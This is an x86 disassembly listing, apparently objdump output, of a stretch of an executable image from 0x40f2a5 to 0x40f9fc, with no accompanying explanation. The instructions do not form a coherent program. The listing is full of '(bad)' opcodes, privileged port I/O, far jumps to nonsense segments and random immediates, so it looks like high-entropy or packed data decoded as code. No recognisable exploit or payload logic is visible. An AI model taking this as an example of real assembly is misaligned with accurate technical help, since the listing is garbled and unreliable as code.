  40f2a5:	add    edi,DWORD PTR [ebx-0x15334594]
  40f2ab:	shl    DWORD PTR [ecx],cl
  40f2ad:	jbe    0x40f2c8
  40f2af:	outs   dx,BYTE PTR ds:[esi]
  40f2b0:	clc    
  40f2b1:	popa   
  40f2b2:	out    dx,al
  40f2b3:	repnz in eax,dx
  40f2b5:	push   edx
  40f2b6:	ja     0x40f328
  40f2b8:	jg     0x40f289
  40f2ba:	mov    ebx,ebx
  40f2bc:	mov    bh,0xc3
  40f2be:	fdiv   QWORD PTR [edx]
  40f2c0:	ret    0xa0a
  40f2c3:	dec    ebx
  40f2c4:	out    0x76,eax
  40f2c6:	pop    es
  40f2c7:	pop    ss
  40f2c8:	inc    eax
  40f2c9:	lock push edi
  40f2cb:	adc    al,0xbe
  40f2cd:	fwait
  40f2ce:	mov    ebx,DWORD PTR [edx]
  40f2d0:	int    0x7d
  40f2d2:	jno    0x40f2bf
  40f2d4:	fcmovbe st,st(3)
  40f2d6:	xchg   BYTE PTR [ebp-0x9869f3f],ch
  40f2dc:	jge    0x40f2b5
  40f2de:	jb     0x40f308
  40f2e0:	sbb    al,0x4b
  40f2e2:	retf   0xf789
  40f2e5:	mov    ch,0x8
  40f2e7:	sub    esp,DWORD PTR [esi+0x18]
  40f2ea:	inc    ebp
  40f2eb:	and    BYTE PTR [edx+edi*8+0x2],dl
  40f2ef:	add    cl,bh
  40f2f1:	mov    al,ds:0xfb296a60
  40f2f6:	mov    ds:0x428208a8,eax
  40f2fb:	sub    DWORD PTR [edx+0x71],ebx
  40f2fe:	fist   WORD PTR ds:0x470efb3f
  40f304:	sar    edi,cl
  40f306:	cs mov esp,0xdd9db409
  40f30c:	inc    eax
  40f30d:	sar    BYTE PTR [edx+0x51178d2b],1
  40f313:	sub    DWORD PTR [ebx+0x83519f0],ebx
  40f319:	call   0x91c76ec9
  40f31e:	adc    esi,ebp
  40f320:	pop    ss
  40f321:	and    eax,0xb11b8995
  40f326:	fsubr  QWORD PTR [ecx]
  40f328:	fmulp  st(3),st
  40f32a:	sub    eax,0xcd7a06fd
  40f32f:	jae    0x40f31e
  40f331:	mov    edx,0xcfa30aeb
  40f336:	pop    es
  40f337:	fisttp QWORD PTR [edi-0x4d]
  40f33a:	fldcw  WORD PTR [ecx]
  40f33c:	adc    esp,edi
  40f33e:	lea    esi,[eax+0x7388ee08]
  40f344:	mov    eax,0x4bb9e642
  40f349:	fld    QWORD PTR [esi]
  40f34b:	je     0x40f387
  40f34d:	lock fisubr WORD PTR [edx+0xcd7b21a]
  40f354:	adc    al,0x62
  40f356:	xor    ebx,DWORD PTR [ebx+ebp*8+0x61323bf0]
  40f35d:	push   ss
  40f35e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f35f:	mov    ss,ebx
  40f361:	test   eax,0xdfe129d8
  40f366:	sti    
  40f367:	jp     0x40f360
  40f369:	call   FWORD PTR [edi+0x3a]
  40f36c:	imul   esp,DWORD PTR [eax-0x232bcccb],0x66
  40f373:	inc    esp
  40f374:	pusha  
  40f375:	push   DWORD PTR [edx-0x61ee30a8]
  40f37b:	mov    esi,0x31503e12
  40f380:	sub    eax,0xa0fd86e2
  40f385:	adc    eax,0x55e77a3e
  40f38a:	in     eax,dx
  40f38b:	sub    BYTE PTR [edi+0x8d2c284],al
  40f391:	jb     0x40f313
  40f393:	ret    
  40f394:	mov    esp,0x9cd1f612
  40f399:	icebp  
  40f39a:	or     al,0x14
  40f39c:	aam    0x49
  40f39e:	inc    esi
  40f39f:	add    bl,BYTE PTR [ecx]
  40f3a1:	aad    0x6f
  40f3a3:	mov    edx,0x3f8741c1
  40f3a8:	in     al,0x4e
  40f3aa:	sar    DWORD PTR [ecx+0x79],0xcc
  40f3ae:	fsubr  QWORD PTR [ecx]
  40f3b0:	sbb    esp,DWORD PTR [edi-0x57d971c6]
  40f3b6:	leave  
  40f3b7:	(bad)  
  40f3b8:	add    cl,BYTE PTR [esi-0x7e]
  40f3bb:	or     cl,BYTE PTR [esi]
  40f3bd:	xchg   edx,esi
  40f3bf:	push   ecx
  40f3c0:	push   es
  40f3c1:	mov    ebp,0x6ab108bd
  40f3c6:	and    BYTE PTR [ecx],ch
  40f3c8:	lahf   
  40f3c9:	mov    WORD PTR [ecx+ebp*2+0x8],es
  40f3cd:	jbe    0x40f397
  40f3cf:	mov    al,ds:0x82d066d9
  40f3d4:	cld    
  40f3d5:	clc    
  40f3d6:	scas   al,BYTE PTR es:[edi]
  40f3d7:	stos   BYTE PTR es:[edi],al
  40f3d8:	call   0x699e:0x8587bed4
  40f3df:	test   eax,0x70deb3f7
  40f3e4:	inc    esi
  40f3e5:	cmp    dh,BYTE PTR [ebp-0x62]
  40f3e8:	hlt    
  40f3e9:	leave  
  40f3ea:	ss aad 0x7f
  40f3ed:	lock lahf 
  40f3ef:	or     al,0xc9
  40f3f1:	jl     0x40f471
  40f3f3:	imul   edi,DWORD PTR [ecx-0x28],0xfffffff2
  40f3f7:	ror    esi,1
  40f3f9:	lock push ebx
  40f3fb:	pop    esi
  40f3fc:	out    dx,eax
  40f3fd:	cdq    
  40f3fe:	leave  
  40f3ff:	nop
  40f400:	mov    dl,0xf1
  40f402:	rcl    BYTE PTR [esp+edx*2],1
  40f405:	ret    
  40f406:	dec    ebx
  40f407:	rcr    bh,cl
  40f409:	sahf   
  40f40a:	call   0xc61b:0x99e90fb5
  40f411:	or     DWORD PTR [eax+0x28],eax
  40f414:	es lock push eax
  40f417:	int3   
  40f418:	(bad)  
  40f419:	push   0x3d
  40f41b:	lods   al,BYTE PTR ds:[esi]
  40f41c:	push   ebx
  40f41d:	(bad)  
  40f41e:	fnstsw WORD PTR [esi+0x26]
  40f421:	lahf   
  40f422:	xchg   DWORD PTR [ecx-0x49],edi
  40f425:	mov    bh,0x77
  40f427:	adc    al,BYTE PTR [ebp+0x7429f545]
  40f42d:	clc    
  40f42e:	push   ds
  40f42f:	nop
  40f430:	or     BYTE PTR [eax-0x53],al
  40f433:	sub    cl,ch
  40f435:	ror    BYTE PTR [edi+ebp*8+0x70],0xf1
  40f43a:	fdiv   DWORD PTR [eax+ebp*4-0x3fa61672]
  40f441:	jg     0x40f4a6
  40f443:	(bad)  
  40f444:	out    0x73,al
  40f446:	xchg   ch,cl
  40f448:	cdq    
  40f449:	sbb    BYTE PTR [edx-0x6f960079],ah
  40f44f:	sub    BYTE PTR [esp+ebx*1-0x24],ch
  40f453:	ror    BYTE PTR [edx+ecx*8],1
  40f456:	and    BYTE PTR [edx+0x375c9788],0x27
  40f45d:	xor    bh,ch
  40f45f:	scas   al,BYTE PTR es:[edi]
  40f460:	mov    BYTE PTR [ebx+0x8239766],0xe6
  40f467:	xor    DWORD PTR [edi-0x64c83312],eax
  40f46d:	iret   
  40f46e:	(bad)  
  40f46f:	mov    ds:0xf7d71409,al
  40f474:	retf   0x8b12
  40f477:	inc    BYTE PTR [esi-0x788eb310]
  40f47d:	jnp    0x40f49b
  40f47f:	sti    
  40f480:	ins    BYTE PTR es:[edi],dx
  40f481:	pop    esi
  40f482:	das    
  40f483:	leave  
  40f484:	rol    cl,cl
  40f486:	xchg   BYTE PTR [ecx+0x46c90b73],ch
  40f48c:	mov    al,0x2d
  40f48e:	dec    edi
  40f48f:	fnstenv [ebx-0x1ed651bb]
  40f495:	push   ebp
  40f496:	jmp    0x40f419
  40f498:	or     esi,edx
  40f49a:	addr16 jmp 0xb683bf6
  40f4a0:	mov    ebx,0xced65ac9
  40f4a5:	jo     0x40f484
  40f4a7:	in     al,0x2e
  40f4a9:	out    0xe3,al
  40f4ab:	out    0x9,eax
  40f4ad:	enter  0x4bd9,0x7b
  40f4b1:	sti    
  40f4b2:	pushf  
  40f4b3:	repz dec eax
  40f4b5:	inc    esi
  40f4b6:	cli    
  40f4b7:	cmp    ebx,DWORD PTR [ebp-0x13]
  40f4ba:	and    al,0x29
  40f4bc:	pop    eax
  40f4bd:	stc    
  40f4be:	add    al,0x84
  40f4c0:	or     BYTE PTR [esi+0x2a],dl
  40f4c3:	les    esi,FWORD PTR ds:0x6e5c6732
  40f4c9:	icebp  
  40f4ca:	jle    0x40f510
  40f4cc:	sub    esi,DWORD PTR [ecx-0x40c94722]
  40f4d2:	mov    bl,0xc8
  40f4d4:	dec    ecx
  40f4d5:	add    DWORD PTR [esi-0x7eeb8e13],eax
  40f4db:	loope  0x40f516
  40f4dd:	loope  0x40f488
  40f4df:	sub    DWORD PTR [edi],ecx
  40f4e1:	aas    
  40f4e2:	je     0x40f494
  40f4e4:	or     DWORD PTR [eax-0x32],ebx
  40f4e7:	cmp    DWORD PTR [eax],0x52
  40f4ea:	(bad)  
  40f4eb:	int3   
  40f4ec:	push   edx
  40f4ed:	sbb    BYTE PTR [ecx+ebp*8+0x53],ah
  40f4f1:	adc    dh,BYTE PTR [edi]
  40f4f3:	sub    DWORD PTR [edi],ecx
  40f4f5:	jmp    DWORD PTR [esi]
  40f4f7:	xor    eax,0x456d8008
  40f4fc:	xor    esp,DWORD PTR [edi]
  40f4fe:	mov    bh,0x1a
  40f500:	xchg   BYTE PTR [eax],bl
  40f502:	scas   eax,DWORD PTR es:[edi]
  40f503:	(bad)  
  40f505:	inc    eax
  40f506:	adc    ebp,DWORD PTR [ecx]
  40f508:	mov    edx,ebp
  40f50a:	xchg   ecx,eax
  40f50b:	loope  0x40f515
  40f50d:	fsubp  st(6),st
  40f50f:	sar    DWORD PTR [edi+eiz*2],1
  40f512:	or     DWORD PTR [esi],edi
  40f514:	push   ecx
  40f515:	lock push es
  40f517:	lar    ecx,WORD PTR [ebx-0x6ef44f43]
  40f51e:	ret    0x6e71
  40f521:	dec    edx
  40f522:	xchg   DWORD PTR [ecx-0x69f4a09a],esp
  40f528:	add    esi,ecx
  40f52a:	jmp    0x675:0x56638d28
  40f531:	test   BYTE PTR [edx+0x7e120fa2],dl
  40f537:	popa   
  40f538:	and    al,0x3c
  40f53a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f53b:	pcmpeqw mm0,mm0
  40f53e:	(bad)  
  40f53f:	sub    ah,bl
  40f541:	aaa    
  40f542:	int    0x1b
  40f544:	or     DWORD PTR [edx],esp
  40f546:	pop    edx
  40f547:	aam    0xd0
  40f549:	ins    BYTE PTR es:[edi],dx
  40f54a:	aaa    
  40f54b:	mov    esi,0xde0c0fdb
  40f550:	pop    ecx
  40f551:	jae    0x40f576
  40f553:	pop    ebx
  40f554:	jb     0x40f50e
  40f556:	xchg   BYTE PTR [edx-0x8],cl
  40f559:	inc    eax
  40f55a:	in     al,dx
  40f55b:	ret    0x2c13
  40f55e:	xchg   BYTE PTR [edi-0x6a3c21de],al
  40f564:	pop    ds
  40f565:	jmp    0x13ae1f26
  40f56a:	sbb    DWORD PTR [edx+0x8],eax
  40f56d:	xor    al,0x88
  40f56f:	out    dx,al
  40f570:	push   ebp
  40f571:	addr16 das 
  40f573:	ss jbe 0x40f575
  40f576:	lock push eax
  40f578:	dec    esi
  40f579:	inc    edi
  40f57a:	sbb    al,0xa7
  40f57c:	aad    0x3d
  40f57e:	popa   
  40f57f:	push   0x3f735f27
  40f584:	xor    ebx,DWORD PTR [eax-0x7e]
  40f587:	rol    DWORD PTR [edi],1
  40f589:	xor    cl,ah
  40f58b:	add    bl,BYTE PTR [esi+0x31]
  40f58e:	ret    
  40f58f:	repnz in eax,dx
  40f591:	aam    0x48
  40f593:	sub    esi,edx
  40f595:	jno    0x40f5a8
  40f597:	inc    ebp
  40f598:	or     BYTE PTR [eax+edi*2],ch
  40f59b:	and    BYTE PTR [ebx+0x6e72d15],ah
  40f5a1:	add    cl,ch
  40f5a3:	test   al,0x37
  40f5a5:	mov    ch,0x27
  40f5a7:	sub    eax,ebp
  40f5a9:	xchg   esp,eax
  40f5aa:	mov    ch,0xae
  40f5ac:	push   ebx
  40f5ad:	(bad)  
  40f5ae:	pop    edi
  40f5af:	adc    cl,BYTE PTR [eax]
  40f5b1:	add    al,0x38
  40f5b3:	loopne 0x40f5d5
  40f5b5:	daa    
  40f5b6:	mov    bl,0xeb
  40f5b8:	ret    
  40f5b9:	cmp    BYTE PTR fs:[ecx],ch
  40f5bc:	(bad)  
  40f5bd:	sti    
  40f5be:	lock pushf 
  40f5c0:	or     DWORD PTR [edx-0x6bd266b0],esi
  40f5c6:	imul   DWORD PTR [edi+0x37660b45]
  40f5cc:	pop    ss
  40f5cd:	int3   
  40f5ce:	push   ecx
  40f5cf:	sub    BYTE PTR [edi+0x67ff385],ch
  40f5d5:	dec    eax
  40f5d6:	add    dl,BYTE PTR [ebx]
  40f5d8:	inc    ebx
  40f5d9:	loop   0x40f5ef
  40f5db:	scas   al,BYTE PTR es:[edi]
  40f5dc:	mov    ebp,eax
  40f5de:	inc    edi
  40f5df:	outs   dx,DWORD PTR fs:[esi]
  40f5e1:	icebp  
  40f5e2:	fcmovbe st,st(1)
  40f5e4:	mov    esi,0x48ef1f4f
  40f5e9:	add    ch,BYTE PTR [edx-0xc]
  40f5ec:	or     DWORD PTR [esi-0x15e06596],esp
  40f5f2:	and    ecx,DWORD PTR [esi]
  40f5f4:	mov    ebp,0x9c618c06
  40f5f9:	lock add al,0xce
  40f5fc:	int3   
  40f5fd:	push   edx
  40f5fe:	jne    0x40f5d8
  40f600:	pop    esp
  40f601:	call   0xe979:0x8202b97a
  40f608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f609:	pop    es
  40f60a:	jbe    0x40f632
  40f60c:	push   edx
  40f60d:	fild   DWORD PTR [edi]
  40f60f:	sub    al,0x6d
  40f611:	cmp    edi,DWORD PTR [edx]
  40f613:	sub    dh,ch
  40f615:	mov    DWORD PTR [ebp-0x4],eax
  40f618:	or     eax,0x967dab2e
  40f61d:	fidivr DWORD PTR [esi+0x18]
  40f620:	mov    al,0x4b
  40f622:	cmp    BYTE PTR [ecx-0x4d],cl
  40f625:	cs aam 0x28
  40f628:	in     eax,dx
  40f629:	mov    dl,BYTE PTR [eax-0x76f1f434]
  40f62f:	push   edi
  40f630:	or     dl,BYTE PTR [esi+0x22]
  40f633:	or     edx,edx
  40f635:	add    BYTE PTR [ebx+0x6ef1e6af],al
  40f63b:	sbb    DWORD PTR [eax],ebx
  40f63d:	retf   
  40f63e:	(bad)  
  40f63f:	in     al,dx
  40f640:	add    esp,edi
  40f642:	dec    ecx
  40f643:	repnz or DWORD PTR [eax+0x6f],esi
  40f647:	loop   0x40f642
  40f649:	jecxz  0x40f6ac
  40f64b:	call   0x45f7:0xa64482d4
  40f652:	mov    WORD PTR [eax+0x7e],es
  40f655:	jmp    0x3c72fca2
  40f65a:	xchg   edi,eax
  40f65b:	add    al,0xb4
  40f65d:	push   0xb30e11d8
  40f662:	push   es
  40f663:	call   0x4d2d8631
  40f668:	jecxz  0x40f65a
  40f66a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f66b:	lock out dx,eax
  40f66d:	loope  0x40f67d
  40f66f:	adc    al,0x80
  40f671:	ins    BYTE PTR es:[edi],dx
  40f672:	cli    
  40f673:	push   cs
  40f674:	popf   
  40f675:	rol    BYTE PTR [esi-0x538df3df],cl
  40f67b:	in     eax,dx
  40f67c:	pop    ecx
  40f67d:	test   eax,0x7205ea5
  40f682:	xchg   dh,ah
  40f684:	jbe    0x40f686
  40f686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f687:	retf   
  40f688:	jmp    0x39056909
  40f68d:	jge    0x40f616
  40f68f:	lods   eax,DWORD PTR ds:[esi]
  40f690:	aaa    
  40f691:	dec    edx
  40f692:	and    dh,al
  40f694:	sti    
  40f695:	pop    ebx
  40f696:	inc    esp
  40f697:	sub    DWORD PTR [edi+eiz*2-0x4f],edx
  40f69b:	out    dx,eax
  40f69c:	or     DWORD PTR [ebp+edx*8-0x6a4e7b4b],esi
  40f6a3:	sbb    esp,DWORD PTR [ebp-0xf]
  40f6a6:	(bad)  
  40f6a7:	pushf  
  40f6a8:	adc    al,0xfd
  40f6aa:	mov    bl,0xd5
  40f6ac:	sahf   
  40f6ad:	xchg   BYTE PTR [eax-0x782c32ce],al
  40f6b3:	push   ecx
  40f6b4:	xchg   ecx,eax
  40f6b5:	fdiv   QWORD PTR [edi+ecx*4]
  40f6b8:	ja     0x40f649
  40f6ba:	adc    ebp,DWORD PTR [ecx]
  40f6bc:	stos   BYTE PTR es:[edi],al
  40f6bd:	pop    ds
  40f6be:	adc    eax,0x8dd80885
  40f6c3:	pop    es
  40f6c4:	xor    DWORD PTR [ebx-0x2e],0x2e
  40f6c8:	pop    edi
  40f6c9:	icebp  
  40f6ca:	aam    0xf4
  40f6cc:	scas   eax,DWORD PTR es:[edi]
  40f6cd:	mov    esp,0xaa53d7dc
  40f6d2:	test   DWORD PTR [ecx-0x18],0xa80d8792
  40f6d9:	lds    ebp,FWORD PTR [edi]
  40f6db:	les    edi,FWORD PTR [ebp+0x31]
  40f6de:	add    ch,BYTE PTR [eax]
  40f6e0:	fsubr  QWORD PTR [esi*8+0x4487f785]
  40f6e7:	dec    ecx
  40f6e8:	mov    ah,0xd4
  40f6ea:	outs   dx,BYTE PTR ds:[esi]
  40f6eb:	adc    eax,0xd096f105
  40f6f0:	push   ebx
  40f6f1:	xchg   ebx,eax
  40f6f2:	in     al,dx
  40f6f3:	test   al,0x50
  40f6f5:	mov    esi,0x1344aab2
  40f6fa:	xchg   BYTE PTR [ebx-0x6e],bl
  40f6fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6fe:	mov    esp,0x9af151d9
  40f703:	int    0x37
  40f705:	scas   eax,DWORD PTR es:[edi]
  40f706:	add    DWORD PTR [edi-0x622c2b36],esi
  40f70c:	push   edx
  40f70d:	xor    al,0x86
  40f70f:	ins    DWORD PTR es:[edi],dx
  40f710:	jmp    0xa7b9:0xaf7b5678
  40f717:	sub    BYTE PTR [eax-0x895725b],bh
  40f71d:	lea    esp,[edi]
  40f71f:	sub    bh,BYTE PTR [eax]
  40f721:	dec    edx
  40f722:	gs add dl,dl
  40f725:	lock add BYTE PTR [ecx+0x9],bh
  40f729:	das    
  40f72a:	push   eax
  40f72b:	xlat   BYTE PTR ds:[ebx]
  40f72c:	xchg   cl,ah
  40f72e:	(bad)  
  40f72f:	fsubr  DWORD PTR [edi+0x66]
  40f732:	xchg   BYTE PTR [ebx-0x7bb4369],al
  40f738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f739:	popa   
  40f73a:	shl    BYTE PTR [esi],1
  40f73c:	xor    dh,BYTE PTR [eax+0x2c553591]
  40f742:	mov    BYTE PTR [eax+0x6c],bh
  40f745:	cmp    DWORD PTR [edi+0x433f674b],eax
  40f74b:	popf   
  40f74c:	mov    esi,eax
  40f74e:	retf   0x6ce1
  40f751:	push   esp
  40f752:	add    ah,BYTE PTR [edx+ebp*2-0x37]
  40f756:	lahf   
  40f757:	loope  0x40f7b9
  40f759:	icebp  
  40f75a:	cld    
  40f75b:	mov    ebp,0x6cdbe66e
  40f760:	jnp    0x40f752
  40f762:	clc    
  40f763:	xchg   edi,eax
  40f764:	xor    DWORD PTR [esi+ebp*1],0xffffffc9
  40f768:	add    bl,bl
  40f76a:	jne    0x40f7cb
  40f76c:	mul    DWORD PTR [ecx]
  40f76e:	inc    ebx
  40f76f:	jo     0x40f79f
  40f771:	or     BYTE PTR [edi+ebx*8-0x65],0xf1
  40f776:	and    BYTE PTR [ebx-0x69],0x4c
  40f77a:	jge    0x40f76a
  40f77c:	retf   0x927d
  40f77f:	leave  
  40f780:	pop    ebp
  40f781:	push   0x9c3f9386
  40f786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f787:	jb     0x40f7ae
  40f789:	mov    bh,0x5e
  40f78b:	das    
  40f78c:	out    0x17,eax
  40f78e:	sbb    bl,ah
  40f790:	jo     0x40f783
  40f792:	test   eax,0x95440628
  40f797:	add    cl,BYTE PTR [eax+0x14cb9dfb]
  40f79d:	add    eax,0xfedbeea6
  40f7a2:	pop    ecx
  40f7a3:	sub    BYTE PTR [ecx+0xea503da],dl
  40f7a9:	shr    ch,cl
  40f7ab:	scas   eax,DWORD PTR es:[edi]
  40f7ac:	pop    ds
  40f7ad:	push   ebp
  40f7ae:	mov    cl,cl
  40f7b0:	lds    esi,FWORD PTR [eax]
  40f7b2:	dec    edi
  40f7b3:	enter  0xa4c5,0xd8
  40f7b7:	daa    
  40f7b8:	sbb    DWORD PTR [edi-0x3f5cdf5],edi
  40f7be:	sbb    ecx,DWORD PTR [ecx+0x9]
  40f7c1:	jl     0x40f789
  40f7c3:	mov    ds:0xf9e4bc3d,al
  40f7c8:	je     0x40f7ba
  40f7ca:	mov    dl,0x48
  40f7cc:	inc    edi
  40f7cd:	div    al
  40f7cf:	pop    ds
  40f7d0:	or     edx,ecx
  40f7d2:	xchg   ebx,eax
  40f7d3:	and    al,0xaf
  40f7d5:	nop
  40f7d6:	mov    edx,0x7442757
  40f7db:	fwait
  40f7dc:	inc    esi
  40f7dd:	lock add al,0xc8
  40f7e0:	mov    esi,0x131b7876
  40f7e5:	or     dh,al
  40f7e7:	adc    DWORD PTR [ecx+0x40058604],ebp
  40f7ed:	cmp    BYTE PTR [edx-0x3f11fede],cl
  40f7f3:	daa    
  40f7f4:	out    dx,eax
  40f7f5:	xchg   ecx,eax
  40f7f6:	add    BYTE PTR [edi+ecx*1-0x4e4fbefc],cl
  40f7fd:	mov    ecx,0x7060a387
  40f802:	dec    ebx
  40f803:	scas   eax,DWORD PTR es:[edi]
  40f804:	fisttp QWORD PTR [ecx+0x42]
  40f807:	or     eax,0xab9fdc6d
  40f80c:	in     eax,0x4f
  40f80e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f80f:	adc    bh,0xec
  40f812:	xchg   ebp,ebp
  40f814:	dec    ebp
  40f815:	shl    esi,cl
  40f817:	pop    edi
  40f818:	iret   
  40f819:	xor    DWORD PTR [ebx+0x28],edx
  40f81c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f81d:	in     eax,0xbc
  40f81f:	mov    eax,0xce85208
  40f824:	rol    al,1
  40f826:	lea    ecx,[ecx]
  40f828:	adc    dh,al
  40f82a:	mov    dl,dh
  40f82c:	inc    ecx
  40f82d:	ret    
  40f82e:	ja     0x40f7c6
  40f830:	hlt    
  40f831:	test   al,0x94
  40f833:	mov    bh,dl
  40f835:	ins    BYTE PTR es:[edi],dx
  40f836:	xchg   DWORD PTR [ebp+0x65],eax
  40f839:	lds    esi,FWORD PTR [ebp+edx*2-0x14]
  40f83d:	lock hlt 
  40f83f:	enter  0x6656,0x9c
  40f843:	push   esp
  40f844:	pusha  
  40f845:	mov    bl,BYTE PTR [edi]
  40f847:	dec    esi
  40f848:	jmp    0x2324:0x6c3b869c
  40f84f:	add    DWORD PTR [ebp-0x38],ebx
  40f852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f853:	sub    bl,al
  40f855:	xor    al,bl
  40f857:	and    al,0xf
  40f859:	xchg   BYTE PTR [ecx+0x351f8854],ah
  40f85f:	sbb    eax,DWORD PTR [edi+0x30]
  40f862:	add    DWORD PTR [ecx+ebx*4],edx
  40f865:	inc    ecx
  40f866:	mov    ah,0x6f
  40f868:	or     cl,BYTE PTR [edi+ecx*8]
  40f86b:	dec    edi
  40f86c:	loopne 0x40f887
  40f86e:	aam    0xc6
  40f870:	out    dx,eax
  40f871:	aad    0x7f
  40f873:	cwde   
  40f874:	ret    
  40f875:	sbb    eax,DWORD PTR [esi+0x67c67733]
  40f87b:	nop
  40f87c:	pop    es
  40f87d:	hlt    
  40f87e:	rcl    DWORD PTR [eax],0xf2
  40f881:	xchg   ecx,eax
  40f882:	fld    QWORD PTR [esi-0x11a5edf8]
  40f888:	je     0x40f82e
  40f88a:	outs   dx,BYTE PTR ds:[esi]
  40f88b:	sub    edi,DWORD PTR [ecx+edx*8+0x3d]
  40f88f:	cdq    
  40f890:	cdq    
  40f891:	jbe    0x40f8f5
  40f893:	push   ss
  40f894:	or     eax,0xd7284c6b
  40f899:	fbstp  TBYTE PTR [ebx-0x58]
  40f89c:	push   0x69f3f2f1
  40f8a1:	dec    edx
  40f8a2:	(bad)  
  40f8a3:	enter  0xf11c,0x14
  40f8a7:	stc    
  40f8a8:	mov    bl,0x7e
  40f8aa:	arpl   WORD PTR [esi-0x61025eae],dx
  40f8b0:	xor    DWORD PTR [ecx+0x7d7e1f86],0xffffffb4
  40f8b7:	rcr    BYTE PTR [ecx-0x6e],cl
  40f8ba:	sub    DWORD PTR es:[eax-0x15],esi
  40f8be:	xchg   ecx,eax
  40f8bf:	call   0xfe7690cd
  40f8c4:	adc    eax,DWORD PTR [ecx]
  40f8c6:	sub    DWORD PTR [esi+edi*2-0x14],ecx
  40f8ca:	mov    dh,0x61
  40f8cc:	jp     0x40f925
  40f8ce:	retf   
  40f8cf:	mov    ds:0x8f07c2d2,eax
  40f8d4:	neg    DWORD PTR [edi+0x5e536980]
  40f8da:	mov    BYTE PTR [edi+0x25],cl
  40f8dd:	lock or ch,BYTE PTR [ebp+ebx*1+0x17]
  40f8e2:	fcomp  DWORD PTR ds:0xf2af3d58
  40f8e8:	or     edx,edx
  40f8ea:	popa   
  40f8eb:	(bad)  
  40f8ec:	jnp    0x40f8fb
  40f8ee:	dec    esp
  40f8f0:	jno    0x40f8e3
  40f8f2:	(bad)  
  40f8f3:	sub    eax,0x49cea681
  40f8f8:	rcl    BYTE PTR [ebx+0x79d9d83e],0x88
  40f8ff:	das    
  40f900:	push   0x21160072
  40f905:	lock enter 0xaa73,0xe5
  40f90a:	call   0x7a51f297
  40f90f:	xor    ebx,DWORD PTR [ecx+0x35381eb]
  40f915:	repnz cmp eax,0xd77fdf54
  40f91b:	or     al,0xbf
  40f91d:	xchg   ebx,eax
  40f91e:	cmp    ebp,DWORD PTR [eax]
  40f920:	les    ebp,FWORD PTR [eax-0x4b]
  40f923:	pop    esp
  40f924:	xor    ebp,edx
  40f926:	dec    ebx
  40f927:	out    dx,al
  40f928:	ja     0x40f995
  40f92a:	shl    DWORD PTR [esi],1
  40f92c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f92d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f92e:	inc    edx
  40f92f:	out    dx,eax
  40f930:	outs   dx,DWORD PTR ds:[esi]
  40f931:	sub    DWORD PTR [edi-0x451281d3],ebx
  40f937:	into   
  40f938:	xchg   ch,bh
  40f93a:	pop    es
  40f93b:	xor    eax,0x98680a0
  40f940:	or     cl,BYTE PTR [ebp+0x34]
  40f943:	mov    edi,0x2842957f
  40f948:	or     eax,0x780815d9
  40f94d:	rcr    BYTE PTR [edi-0x159695b1],cl
  40f953:	sub    eax,esi
  40f955:	call   0x95fa53a5
  40f95a:	leave  
  40f95b:	sub    ebx,edx
  40f95d:	sub    al,0x55
  40f95f:	mov    al,ds:0x955aff7
  40f964:	sbb    BYTE PTR [edx],al
  40f966:	int3   
  40f967:	shl    BYTE PTR [esi-0x10],cl
  40f96a:	pusha  
  40f96b:	push   esi
  40f96c:	hlt    
  40f96d:	dec    edi
  40f96e:	lods   eax,DWORD PTR ds:[esi]
  40f96f:	xor    BYTE PTR [ebp+ecx*2-0xcf678a3],bh
  40f976:	xchg   cl,bl
  40f978:	cmp    esi,DWORD PTR [ecx]
  40f97a:	pushf  
  40f97b:	outs   dx,DWORD PTR ds:[si]
  40f97d:	hlt    
  40f97e:	jle    0x40f9a8
  40f980:	je     0x40f9f5
  40f982:	adc    BYTE PTR [ebx],ah
  40f984:	or     BYTE PTR [esi-0x7e],dh
  40f987:	xor    al,BYTE PTR [eiz*8-0xe2bc53e]
  40f98e:	push   esp
  40f98f:	cmp    DWORD PTR [eax+0x1a],eax
  40f992:	ret    0x1589
  40f995:	adc    ebx,ebp
  40f997:	sbb    ebx,DWORD PTR [ebx+eax*1]
  40f99a:	icebp  
  40f99b:	xlat   BYTE PTR ds:[ebx]
  40f99c:	or     BYTE PTR [eax],bh
  40f99e:	jae    0x40f932
  40f9a0:	and    al,0x8d
  40f9a2:	sti    
  40f9a3:	dec    ebx
  40f9a4:	push   es
  40f9a5:	lock mov esp,ss
  40f9a8:	xchg   BYTE PTR [ecx],dl
  40f9aa:	pop    ebp
  40f9ab:	sbb    BYTE PTR [eax+0x736df8cb],cl
  40f9b1:	push   0xc2a4a587
  40f9b6:	mov    ecx,0x6d8a29ed
  40f9bb:	sub    DWORD PTR [esi-0x62],esi
  40f9be:	fsub   st,st(4)
  40f9c0:	xlat   BYTE PTR ds:[ebx]
  40f9c1:	push   edx
  40f9c2:	pusha  
  40f9c3:	inc    edx
  40f9c4:	and    DWORD PTR [eax-0xe5307b9],edi
  40f9ca:	or     al,0xf4
  40f9cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9cd:	xchg   esi,eax
  40f9ce:	sbb    al,0x96
  40f9d0:	pop    edi
  40f9d1:	repnz (bad) 
  40f9d3:	fisttp WORD PTR [edx+0x42da9a5f]
  40f9d9:	pop    ecx
  40f9da:	in     eax,dx
  40f9db:	mov    esp,0x88576208
  40f9e0:	and    ecx,DWORD PTR [edx-0xa]
  40f9e3:	xchg   edx,eax
  40f9e4:	sbb    eax,esi
  40f9e6:	call   0xf0bd460f
  40f9eb:	and    al,0x25
  40f9ed:	rol    DWORD PTR [ebx-0x790d631d],0xdb
  40f9f4:	daa    
  40f9f5:	(bad)  
  40f9f6:	xchg   ebp,eax
  40f9f7:	cld    
  40f9f8:	pop    edi
  40f9f9:	inc    esp
  40f9fa:	xor    BYTE PTR [eax],ch
  40f9fc:	xchg   ebp,eax
